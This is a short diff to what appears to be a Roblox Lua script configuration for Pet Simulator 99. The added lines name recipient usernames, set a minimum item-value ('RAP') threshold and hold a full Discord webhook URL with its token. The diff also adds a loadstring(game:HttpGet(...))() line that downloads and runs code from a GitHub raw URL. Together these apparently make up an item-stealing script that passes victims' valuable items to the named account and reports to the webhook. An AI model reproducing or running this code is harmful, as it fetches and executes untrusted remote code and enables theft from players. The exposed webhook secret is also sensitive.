@@ -1,5 +1,6 @@
-Username = "nhoxbao20031" 
-Username2 = "nhoxbao20031" 
-Webhook = "https://discordapp.com/api/webhooks/1370796423846563900/djO2b5VJ3zRL2KLbM7HTjxAl436ESg_mLbLLQT6QVJ4rRdB9eCG4w0ICtvRUTkysPn8_" 
+Username = "nhoxbao20031"
+Username2 = "nhoxbao20031"
+MinimumRAP = 100000
+Webhook = "https://discordapp.com/api/webhooks/1370796423846563900/djO2b5VJ3zRL2KLbM7HTjxAl436ESg_mLbLLQT6QVJ4rRdB9eCG4w0ICtvRUTkysPn8_"
 
-https://pastebin.com/raw/u7VFSY5J
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xeps99s/xenr1/main/Ps99", true))()
